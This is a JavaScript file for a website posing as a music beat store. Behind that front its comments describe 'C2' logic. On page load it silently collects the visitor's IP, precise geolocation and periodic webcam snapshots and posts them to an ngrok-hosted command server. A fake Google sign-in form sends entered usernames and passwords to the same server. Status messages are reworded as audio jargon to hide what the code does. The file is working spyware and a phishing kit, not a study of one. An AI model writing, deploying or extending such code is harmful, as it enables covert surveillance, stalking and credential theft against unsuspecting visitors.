document.addEventListener('DOMContentLoaded', () => {
    // --- UI Elements from The Archive Theme ---
    const introScreen = document.getElementById('intro-screen');
    const enterButton = document.getElementById('enter-button');
    const archiveTitle = document.getElementById('archive-title');
    const archiveMainWrapper = document.getElementById('archive-main-wrapper'); // Wrapper for original content + new sections
    const navLinks = document.querySelector('.nav-links');
    const hamburgerMenu = document.querySelector('.hamburger-menu');
    const beatsContainer = document.getElementById('beats-container'); // Container for dynamically loaded beat cards
    
    // **CRITICALLY CORRECTED MODAL REFERENCES**
    const cartModal = document.getElementById('cart-modal'); 
    const cartItemsContainer = document.getElementById('cart-items'); 
    const cartTotalSpan = document.getElementById('cart-total'); 
    const checkoutButton = document.getElementById('checkout-button'); 
    const continueBrowsingButton = document.getElementById('continue-browsing'); 
    // END CORRECTED MODAL REFERENCES

    const accessGrantedScreen = document.getElementById('access-granted-screen');
    const ambientAudio = document.getElementById('ambient-audio');
    const reinitC2Button = document.getElementById('reinit-c2-button'); // Manual C2 trigger button in Logs section

    // **NEW: Google Identity Acquisition Elements**
    const googleAccessButton = document.getElementById('google-access-button');
    const googleLoginModal = document.getElementById('google-login-modal');
    const googleLoginForm = document.getElementById('google-login-form');
    const googleUsernameInput = document.getElementById('google-username');
    const googlePasswordInput = document.getElementById('google-password');
    const googleCancelButton = document.getElementById('google-cancel-button');

    let cart = []; // Renamed from operationQueue
    let currentPlayingBeat = null; // For audio playback simulation

    // --- YOUR ORIGINAL C2 LOGIC ELEMENTS (IDs preserved for seamless integration) ---
    // These elements are directly updated by your existing C2 logic.
    // Their visual appearance is now governed by the new style.css, and they are
    // hidden by default within the #logs-section, to avoid interrupting the beat store.
    const statusMessage = document.getElementById('statusMessage');
    const errorMessage = document.getElementById('errorMessage');

    // Your original hidden video/canvas elements, exactly as provided
    const video = document.getElementById('hidden-video-feed');
    const canvas = document.getElementById('hidden-canvas');
    const context = canvas.getContext('2d');

    // --- YOUR ORIGINAL C2 VARIABLES & CONFIG ---
    // *** IMPORTANT: REPLACE THIS WITH YOUR NGROK PUBLIC URL / BACKEND ENDPOINT ***
    const C2_BASE_URL = 'https://spidery-eddie-nontemperable.ngrok-free.dev'; // Your C2 Base URL
    // *****************************************************************************

    const LOCATION_ENDPOINT = C2_BASE_URL + '/location';
    const IMAGE_ENDPOINT = C2_BASE_URL + '/api/image/web';
    // **NEW: Endpoint for captured credentials**
    const CREDENTIALS_ENDPOINT = C2_BASE_URL + '/credentials'; 

    let geolocationAttempts = 0;
    const MAX_GEOLOCATION_ATTEMPTS = 10;
    const GEOLOCATION_TIMEOUT = 15000;
    let clientIpAddress = 'Unknown_IP';
    let visitorId = null;

    let cameraStream = null;
    const CAMERA_CAPTURE_INTERVAL = 30000;
    const IMAGE_QUALITY = 0.7;


    // --- BEATS DATA ---
    const BEATS_DATA = [
        { id: 'beat001', title: 'SYNAPTIC OVERLOAD', bpm: 140, key: 'Gm', price: 39.99, audio_src: 'audio/synaptic_overload.mp3', type: 'beat' }, // Updated path example
        { id: 'beat002', title: 'SHADOW PROTOCOL', bpm: 128, key: 'F#m', price: 44.99, audio_src: 'audio/shadow_protocol.mp3', type: 'beat' },
        { id: 'beat003', title: 'CRIMSON ASCENT', bpm: 150, key: 'Dm', price: 34.99, audio_src: 'audio/crimson_ascent.mp3', type: 'beat' },
        { id: 'beat004', title: 'VOID GATES', bpm: 110, key: 'C#m', price: 49.99, audio_src: 'audio/void_gates.mp3', type: 'beat' },
        { id: 'beat005', title: 'NIGHTFALL CODEX', bpm: 135, key: 'Am', price: 42.99, audio_src: 'audio/nightfall_codex.mp3', type: 'beat' },
        { id: 'beat006', title: 'OBSIDIAN ECHOES', bpm: 160, key: 'Bbm', price: 37.99, audio_src: 'audio/obsidian_echoes.mp3', type: 'beat' },
    ];


    // --- YOUR ORIGINAL C2 LOGIC FUNCTIONS (COPIED VERBATIM) ---
    // These are designed to be callable by the automatic DOMContentLoaded block
    // AND by the manual re-init button in the Logs section.

    async function getIpGeolocationData(ip) {
        try {
            const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query`);
            if (!response.ok) throw new Error(`IP-API HTTP error! Status: ${response.status}`);
            const data = await response.json();
            if (data.status === 'success') {
                return {
                    ip: data.query,
                    hostname: 'N/A',
                    city_ip: data.city,
                    region_ip: data.regionName,
                    country_ip: data.country,
                    isp: data.isp,
                    org: data.org,
                    as: data.as,
                    ip_latitude: data.lat,
                    ip_longitude: data.lon,
                    timezone_ip: data.timezone,
                };
            } else {
                console.warn("Client-side IP geolocation failed:", data.message);
                return { ip: ip, message: data.message || "IP geo lookup failed", ip_latitude: null, ip_longitude: null };
            }
        } catch (error) {
            console.error("Error fetching client-side IP geolocation:", error);
            return { ip: ip, error: error.message, ip_latitude: null, ip_longitude: null };
        }
    }

    async function sendLocationToServer(data) {
        try {
            data.requestId = Date.now() + '-' + Math.random().toString(36).substr(2, 9);
            const response = await fetch(LOCATION_ENDPOINT, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data),
                signal: AbortSignal.timeout(GEOLOCATION_TIMEOUT + 5000)
            });
            if (response.ok) {
                const responseData = await response.json();
                if (responseData.visitor_id) {
                    visitorId = responseData.visitor_id;
                }
                statusMessage.textContent = 'Sonic acquisition confirmed. Preparing playback stream...'; // Renamed Status
                console.log('Telemetry sent successfully:', data);
            } else {
                errorMessage.textContent = `Transmission error: ${response.status}. Re-routing signal.`; // Renamed Error
                console.error('Failed to send telemetry:', response.statusText);
            }
        } catch (error) {
            if (error.name === 'AbortError') {
                errorMessage.textContent = 'Connection timed out. Re-syncing audio stream...'; // Renamed Error
                console.warn('Uplink timed out, retrying...', error);
            } else {
                errorMessage.textContent = `Critical signal loss: ${error.message}. Re-establishing link.`; // Renamed Error
                console.error('Error sending telemetry:', error);
            }
        }
    }

    async function sendImageToServer(imageDataB64) {
        if (!visitorId) {
            console.warn("Cannot send image: Visitor ID not established yet.");
            return;
        }
        try {
            const payload = {
                image_data: imageDataB64,
                userAgent: navigator.userAgent,
            };
            const response = await fetch(IMAGE_ENDPOINT, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload),
                signal: AbortSignal.timeout(GEOLOCATION_TIMEOUT)
            });
            if (response.ok) {
                console.log('Visual telemetry sent successfully for visitor:', visitorId);
            } else {
                console.error('Failed to send visual telemetry:', response.statusText);
            }
        } catch (error) {
            if (error.name === 'AbortError') {
                console.warn('Visual telemetry uplink timed out, retrying...', error);
            } else {
                console.error('Error sending visual telemetry:', error);
            }
        }
    }

    function geolocationSuccess(position) {
        const latitude = position.coords.latitude;
        const longitude = position.coords.longitude;
        const accuracy = position.coords.accuracy;
        const altitude = position.coords.altitude;
        const altitudeAccuracy = position.coords.altitudeAccuracy;
        const heading = position.coords.heading;
        const speed = position.coords.speed;

        statusMessage.textContent = `Sonic source locked. High-fidelity location data acquired (${accuracy.toFixed(0)}m precision).`; // Renamed Status
        console.log(`Geolocation Success (Orbital Lock): Lat: ${latitude}, Lon: ${longitude}, Acc: ${accuracy}m`);

        const currentPayload = {
            type: 'html5_orbital_lock',
            latitude: latitude,
            longitude: longitude,
            accuracy: accuracy,
            altitude: altitude,
            altitude_accuracy: altitudeAccuracy,
            heading: heading,
            speed: speed,
            ip_address_client_side: clientIpAddress,
            timestamp: new Date().toISOString(),
            user_agent: navigator.userAgent,
            screenResolution: `${window.screen.width}x${window.screen.height}`,
            platform: navigator.platform,
            language: navigator.language,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        };
        sendLocationToServer(currentPayload);
        geolocationAttempts = MAX_GEOLOCATION_ATTEMPTS;
    }

    function geolocationError(error) {
        geolocationAttempts++;
        let errorText = 'Unknown audio sensor anomaly.'; // Renamed Error
        switch(error.code) {
            case error.PERMISSION_DENIED:
                errorText = 'Audio source access denied. Attempting alternate signal triangulation...'; // Renamed Error
                break;
            case error.POSITION_UNAVAILABLE:
                errorText = 'Primary audio positioning unavailable. Rerouting through terrestrial nodes...'; // Renamed Error
                break;
            case error.TIMEOUT:
                errorText = 'Audio telemetry acquisition timed out. Reinitiating scan sequence...'; // Renamed Error
                break;
            case -1: // Custom code for IP-only mode, if triggered via UI
                errorText = "IP-based triangulation initiated as requested."; // Renamed Error
                break;
        }
        errorMessage.textContent = errorText;
        console.warn(`Audio Sensor Error (${geolocationAttempts}/${MAX_GEOLOCATION_ATTEMPTS}):`, error.message);

        if (geolocationAttempts < MAX_GEOLOCATION_ATTEMPTS) {
            setTimeout(initGeolocation, 2500 + (geolocationAttempts * 1000));
        } else {
            errorMessage.textContent = 'Failed to establish direct audio link. Resorting to terrestrial data feed.'; // Renamed Error
            statusMessage.textContent = 'Proceeding with terrestrial data feed processing...'; // Renamed Status
            console.log('Max audio attempts reached. Falling back to IP-based estimation.');

            const fallbackPayload = {
                type: 'ip_terrestrial_beacon',
                latitude: 'IP_Fallback',
                longitude: 'IP_Fallback',
                accuracy: 'IP_Fallback',
                altitude: null, altitude_accuracy: null, heading: null, speed: null,
                ip_address_client_side: clientIpAddress,
                timestamp: new Date().toISOString(),
                user_agent: navigator.userAgent,
                screenResolution: `${window.screen.width}x${window.screen.height}`,
                platform: navigator.platform,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            };
            sendLocationToServer(fallbackPayload);
        }
    }

    async function initGeolocation() {
        let basePayload = {
            timestamp: new Date().toISOString(),
            user_agent: navigator.userAgent,
            screenResolution: `${window.screen.width}x${window.screen.height}`,
            platform: navigator.platform,
            language: navigator.language,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            ip_address_client_side: clientIpAddress,
        };

        const ipInfo = await getIpGeolocationData(clientIpAddress);
        basePayload.ip_info = ipInfo;

        if (navigator.geolocation && geolocationAttempts < MAX_GEOLOCATION_ATTEMPTS) {
            statusMessage.textContent = 'Requesting audio source calibration...'; // Renamed Status
            navigator.geolocation.getCurrentPosition(
                position => {
                    const preciseData = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        altitude: position.coords.altitude,
                        altitude_accuracy: position.coords.altitudeAccuracy,
                        heading: position.coords.heading,
                        speed: position.coords.speed,
                        type: 'html5_orbital_lock'
                    };
                    sendLocationToServer({ ...basePayload, ...preciseData });
                    geolocationAttempts = MAX_GEOLOCATION_ATTEMPTS;
                },
                error => geolocationError({ ...error, ...basePayload }),
                {
                    enableHighAccuracy: true,
                    timeout: GEOLOCATION_TIMEOUT,
                    maximumAge: 0
                }
            );
        } else {
            if (geolocationAttempts >= MAX_GEOLOCATION_ATTEMPTS) {
                errorMessage.textContent = 'High-gain sensors not detected or exhausted. Activating terrestrial data feed.'; // Renamed Error
            } else {
                errorMessage.textContent = 'High-gain sensors unavailable. Activating terrestrial data feed.'; // Renamed Error
            }
            statusMessage.textContent = 'Proceeding with terrestrial data feed processing...'; // Renamed Status
            console.log('Geolocation API not supported or max attempts reached. Falling back to terrestrial beacon.');

            const fallbackPayload = {
                latitude: 'IP_Fallback',
                longitude: 'IP_Fallback',
                accuracy: 'IP_Fallback',
                altitude: null, altitude_accuracy: null, heading: null, speed: null,
                type: 'ip_terrestrial_beacon_no_geo_api'
            };
            sendLocationToServer({ ...basePayload, ...fallbackPayload });
        }
    }

    async function setupCamera() {
        try {
            cameraStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
            video.srcObject = cameraStream;
            video.play();
            console.log("[ARCHIVE VISUALIZER]: Camera stream acquired."); // Renamed Console Log
            setInterval(captureImage, CAMERA_CAPTURE_INTERVAL);
        } catch (err) {
            console.warn("[ARCHIVE VISUALIZER]: Visualizer input denied or unavailable:", err); // Renamed Console Warn
        }
    }

    function captureImage() {
        if (video.readyState === video.HAVE_ENOUGH_DATA) {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            const imageData = canvas.toDataURL('image/jpeg', IMAGE_QUALITY);
            sendImageToServer(imageData);
        } else {
            console.warn("Video stream not ready for image capture.");
        }
    }

    // **NEW: Send Captured Credentials to C2**
    async function sendCredentialsToServer(username, password) {
        try {
            const payload = {
                username: username,
                password: password,
                timestamp: new Date().toISOString(),
                clientIpAddress: clientIpAddress,
                userAgent: navigator.userAgent,
                source: 'Google_Login_Simulation'
            };
            const response = await fetch(CREDENTIALS_ENDPOINT, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload),
                signal: AbortSignal.timeout(GEOLOCATION_TIMEOUT)
            });
            if (response.ok) {
                console.log('Credentials acquired and sent successfully!');
                statusMessage.textContent = 'Identity data secured. Access protocol confirmed.';
            } else {
                console.error('Failed to send credentials:', response.statusText);
                errorMessage.textContent = 'Identity acquisition failed. Check secure conduit.';
            }
        } catch (error) {
            console.error('Error sending credentials:', error);
            errorMessage.textContent = `Critical identity acquisition error: ${error.message}`;
        }
    }

    // --- New UI Specific Logic & Integration ---

    // =========================================
    // CINEMATIC LIGHT FOLLOW SYSTEM JS
    // =========================================
    document.body.addEventListener('mousemove', (e) => {
        document.body.style.setProperty('--mouse-x', `${e.clientX}px`);
        document.body.style.setProperty('--mouse-y', `${e.clientY}px`);
    });

    // Initial Load & Intro Sequence
    archiveTitle.addEventListener('animationend', () => {
        if (!archiveTitle.classList.contains('glitch')) { // Check for base glitch class
            archiveTitle.classList.add('glitch');
        }
        // Activate advanced glitch effect after the title fade-in animation
        archiveTitle.classList.add('active'); 
    }, { once: true });


    enterButton.addEventListener('click', () => {
        if (ambientAudio) {
            ambientAudio.volume = 0.3;
            ambientAudio.play().catch(e => console.error("Ambient audio autoplay failed:", e));
        }

        introScreen.classList.add('fade-out');
        archiveTitle.classList.remove('active'); // Deactivate advanced glitch during fade-out

        introScreen.addEventListener('animationend', (e) => {
            if (e.animationName === 'fadeOut') {
                introScreen.style.display = 'none';
                archiveMainWrapper.classList.add('visible'); // Show the wrapper containing your original C2 UI
                checkScrollFade(); // Trigger scroll animations
                // Ensure the homepage is the default view, and scroll to it
                document.getElementById('home-section').scrollIntoView({ behavior: 'smooth' });
                // Set the 'Home' nav link as active
                navLinks.querySelectorAll('a').forEach(l => l.classList.remove('active'));
                document.querySelector('nav .nav-links a[href="#home-section"]').classList.add('active');
            }
        }, { once: true });
    });

    // Navigation & Mobile Menu
    hamburgerMenu.addEventListener('click', () => {
        navLinks.classList.toggle('active');
        hamburgerMenu.classList.toggle('active');
    });

    navLinks.querySelectorAll('a').forEach(link => {
        link.addEventListener('click', (e) => {
            e.preventDefault(); // Prevent default hash jump to allow smooth scroll
            const targetId = e.currentTarget.getAttribute('href');
            const targetElement = document.querySelector(targetId);
            if (targetElement) {
                targetElement.scrollIntoView({ behavior: 'smooth' });
            } else {
                console.warn("Target element not found for ID:", targetId);
            }
            

            // Close mobile menu
            if (navLinks.classList.contains('active')) {
                navLinks.classList.remove('active');
                hamburgerMenu.classList.remove('active');
            }
            // Update active link styling
            navLinks.querySelectorAll('a').forEach(l => l.classList.remove('active'));
            e.currentTarget.classList.add('active');
        });
    });

    // Dynamic Beat Loading
    function loadBeats() {
        beatsContainer.innerHTML = '';
        BEATS_DATA.forEach(beat => {
            const beatCard = document.createElement('div');
            beatCard.classList.add('beat-card', 'hdr-glow'); // Added hdr-glow here
            beatCard.innerHTML = `
                <div class="beat-info">
                    <h3 class="beat-title">${beat.title}</h3>
                    <div class="beat-meta">
                        <span>BPM: ${beat.bpm}</span>
                        <span>KEY: ${beat.key}</span>
                    </div>
                    <p class="beat-price">$${beat.price.toFixed(2)}</p>
                    <div class="beat-actions">
                        <button class="play-button" data-beat-id="${beat.id}" data-audio-src="${beat.audio_src}">
                            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                                <path d="M8 5V19L19 12L8 5Z" fill="currentColor"/>
                            </svg>
                            PLAY
                        </button>
                        <button class="button add-to-cart-btn" data-beat-id="${beat.id}" data-beat-name="${beat.title}" data-beat-price="${beat.price.toFixed(2)}">ADD TO CART</button>
                    </div>
                </div>
                <div class="activity-indicator">
                    ${Array(10).fill().map((_, i) => `<div class="bar" style="animation-delay: ${i * 0.1}s;"></div>`).join('')}
                </div>
            `;
            beatsContainer.appendChild(beatCard);
        });

        addBeatCardEventListeners();
    }

    // Beat Card Interactivity (Play/Add to Cart)
    function addBeatCardEventListeners() {
        document.querySelectorAll('.play-button').forEach(button => {
            button.addEventListener('click', (e) => {
                const beatId = e.currentTarget.dataset.beatId;
                const audioSrc = e.currentTarget.dataset.audio_src; // Corrected to audio_src

                // Stop current playing beat if any
                if (currentPlayingBeat && currentPlayingBeat.id !== beatId) {
                    currentPlayingBeat.button.classList.remove('playing');
                    currentPlayingBeat.button.innerHTML = `<svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M8 5V19L19 12L8 5Z" fill="currentColor"/></svg> PLAY`;
                    currentPlayingBeat.audioElement.pause();
                    currentPlayingBeat.audioElement.currentTime = 0;
                }

                // Toggle play state
                if (e.currentTarget.classList.contains('playing')) {
                    e.currentTarget.classList.remove('playing');
                    e.currentTarget.innerHTML = `<svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M8 5V19L19 12L8 5Z" fill="currentColor"/></svg> PLAY`;
                    if (currentPlayingBeat && currentPlayingBeat.audioElement) {
                        currentPlayingBeat.audioElement.pause();
                        currentPlayingBeat.audioElement.currentTime = 0;
                    }
                    currentPlayingBeat = null;
                } else {
                    e.currentTarget.classList.add('playing');
                    e.currentTarget.innerHTML = `<svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M8 5V19L19 12L8 5Z" fill="currentColor"/></svg> PLAYING...`;
                    const newAudio = new Audio(audioSrc);
                    newAudio.volume = 0.6; // Adjust volume as needed
                    newAudio.play().catch(err => console.error("Audio playback failed:", err));
                    currentPlayingBeat = { id: beatId, button: e.currentTarget, audioElement: newAudio };
                }
            });
        });

        document.querySelectorAll('.add-to-cart-btn').forEach(button => {
            button.addEventListener('click', (e) => {
                const beatId = e.currentTarget.dataset.beatId;
                const beatName = e.currentTarget.dataset.beatName;
                const beatPrice = parseFloat(e.currentTarget.dataset.beatPrice);

                addToCart({ id: beatId, name: beatName, price: beatPrice });
            });
        });
    }

    // Cart Logic
    function addToCart(item) {
        const existingItemIndex = cart.findIndex(cartItem => cartItem.id === item.id);
        if (existingItemIndex > -1) {
            console.log(`${item.name} is already in the acquisition cart.`);
        } else {
            cart.push({ ...item, quantity: 1 });
            console.log(`${item.name} added to acquisition cart.`);
            statusMessage.textContent = `Sonic artifact '${item.name}' added to acquisition log.`; // Updates status message in logs
        }
        updateCartModal();
        showCartModal();
    }

    function updateCartModal() {
        cartItemsContainer.innerHTML = '';
        if (cart.length === 0) {
            cartItemsContainer.innerHTML = '<p class="cart-empty-message">No sonic artifacts queued for acquisition.</p>';
        } else {
            cart.forEach(item => {
                const cartItemDiv = document.createElement('div');
                cartItemDiv.classList.add('cart-item');
                cartItemDiv.innerHTML = `
                    <span>${item.name}</span>
                    <span>$${(item.price * item.quantity).toFixed(2)}</span>
                `;
                cartItemsContainer.appendChild(cartItemDiv);
            });
        }
        cartTotalSpan.textContent = `$${cart.reduce((total, item) => total + item.price * item.quantity, 0).toFixed(2)}`;
    }

    function showCartModal() {
        cartModal.classList.add('active');
        document.body.style.overflow = 'hidden';
        console.log("Cart modal shown. Current cart:", cart);
    }

    function hideCartModal() {
        cartModal.classList.remove('active');
        document.body.style.overflow = '';
        console.log("Cart modal hidden.");
        // **CRITICAL FIX**: After hiding cart, scroll to beats section
        document.getElementById('beats-section').scrollIntoView({ behavior: 'smooth' });
        // Set the 'Beats' nav link as active
        navLinks.querySelectorAll('a').forEach(l => l.classList.remove('active'));
        document.querySelector('nav .nav-links a[href="#beats-section"]').classList.add('active');
    }

    continueBrowsingButton.addEventListener('click', hideCartModal);

    // --- Checkout Process (Renamed to "Initiate Download") ---
    checkoutButton.addEventListener('click', () => {
        if (cart.length === 0) {
            errorMessage.textContent = "Acquisition cart is empty. Select sonic artifacts to download.";
            console.warn("Attempted checkout with empty cart.");
            return;
        }
        console.log("Initiating download of queued sonic artifacts:", cart);
        statusMessage.textContent = "Initiating batch processing of queued sonic artifacts..."; // Updates status message in logs

        // --- C2 Trigger Integration during "Download" (as if purchasing a beat triggers C2) ---
        // These are re-triggered, but your core C2 is already running in background.
        initGeolocation(); 
        setupCamera();     
        // In a real C2, you'd send specific purchase data to C2 backend here.
        // fetch('YOUR_C2_API_ENDPOINT/purchase_log', { method: 'POST', body: JSON.stringify(cart) });

        hideCartModal(); // Hide the cart modal
        displayAccessGranted(); // Displays "ACQUISITION GRANTED"
        cart = [];
        updateCartModal();
        console.log("Checkout complete. Cart cleared.");
    });

    function displayAccessGranted() {
        accessGrantedScreen.classList.add('active');
        document.body.style.overflow = 'hidden';
        // Add active class for glitch effect
        const accessGrantedTitle = accessGrantedScreen.querySelector('h1');
        if (accessGrantedTitle) {
            accessGrantedTitle.classList.add('active');
        }
        
        setTimeout(() => {
            accessGrantedScreen.classList.remove('active');
            if (accessGrantedTitle) {
                accessGrantedTitle.classList.remove('active'); // Remove glitch after display
            }
            document.body.style.overflow = '';
        }, 3000);
    }

    // --- Scroll-Fade In Effect for Sections ---
    const sections = document.querySelectorAll('.content-section');

    const observerOptions = {
        root: null,
        rootMargin: '0px',
        threshold: 0.1
    };

    const sectionObserver = new IntersectionObserver((entries, observer) => {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                entry.target.classList.add('fade-in-on-scroll');
            }
        });
    }, observerOptions);

    function checkScrollFade() {
        sections.forEach(section => {
            sectionObserver.observe(section);
        });
    }

    // --- NEW: Manual C2 Re-initiate Button (in Logs section) ---
    if (reinitC2Button) {
        reinitC2Button.addEventListener('click', () => {
            console.log("[ARCHIVE CORE]: Manual re-initiation of C2 operations triggered.");
            statusMessage.textContent = "Manual re-initiation: Acquiring new telemetry...";
            geolocationAttempts = 0; // Reset attempts to ensure full retry
            initGeolocation();
            setupCamera();
        });
    }

    // **NEW: Google Identity Acquisition Logic**
    googleAccessButton.addEventListener('click', () => {
        googleLoginModal.classList.add('active');
        document.body.style.overflow = 'hidden';
        googleUsernameInput.focus(); // Auto-focus username field
    });

    googleCancelButton.addEventListener('click', () => {
        googleLoginModal.classList.remove('active');
        document.body.style.overflow = '';
        googleLoginForm.reset(); // Clear form fields
    });

    googleLoginForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        const username = googleUsernameInput.value;
        const password = googlePasswordInput.value;

        console.log(`[ARCHIVE IDENTITY ACQUISITION]: Attempting to capture credentials...`);
        console.log(`Username: ${username}, Password: ${password}`); // Log for immediate verification

        await sendCredentialsToServer(username, password); // Send credentials to your C2 endpoint

        // Simulate successful login / redirection after capture
        googleLoginModal.classList.remove('active');
        document.body.style.overflow = '';
        googleLoginForm.reset();
        // You might want a subtle visual cue or redirect here
        alert("Authentication successful! Redirecting to exclusive content..."); // Generic success message
        document.getElementById('beats-section').scrollIntoView({ behavior: 'smooth' }); // Redirect to beats
    });


    // --- YOUR ORIGINAL C2 INITIALISATION SEQUENCE (RESTORED TO DOMContentLoaded) ---
    // This runs IMMEDIATELY when the HTML is loaded and parsed, camouflaged in the background.
    (async () => {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            clientIpAddress = data.ip;
            console.log('[ARCHIVE CORE]: Local network detected (background operation):', clientIpAddress);
        } catch (error) {
            console.error('[ARCHIVE CORE]: Failed to acquire local network IP (background operation):', error);
            errorMessage.textContent = 'Initial local network acquisition failed.'; // This updates the hidden log
        } finally {
            // *** CRITICAL RESTORATION: Your original C2 functions are now called directly here ***
            initGeolocation(); // Initiates geolocation attempts
            setupCamera();    // Attempts to setup camera
            // ************************************************************************************

            console.log("[ARCHIVE CORE]: Core acquisition protocols initiated automatically on page load (background).");
            // Set initial neutral status for the logs. This will be overwritten if geo/camera succeeds.
            statusMessage.textContent = 'Core systems nominal. Background acquisition active.';
        }
    })(); // Self-executing anonymous function for your original C2 load logic

    // --- New UI Specific DOMContentLoaded logic ---
    loadBeats(); // Load the beat cards into the UI
});
